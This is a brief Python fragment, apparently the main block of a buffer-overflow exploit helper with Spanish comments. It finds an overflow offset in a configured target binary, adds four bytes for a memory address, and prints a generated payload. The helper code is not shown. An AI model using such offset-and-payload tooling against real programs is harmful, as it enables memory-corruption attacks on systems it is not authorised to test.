...
if __name__ == "__main__":
    ...
    payload_length = get_breakpoint(lista_asquerosa, json_config['binary_path']) + 4 # Cuatro del Tamaño de la Direccion de Memoria
    print(create_payload.gen_payload2(payload_length,lista_asquerosa))
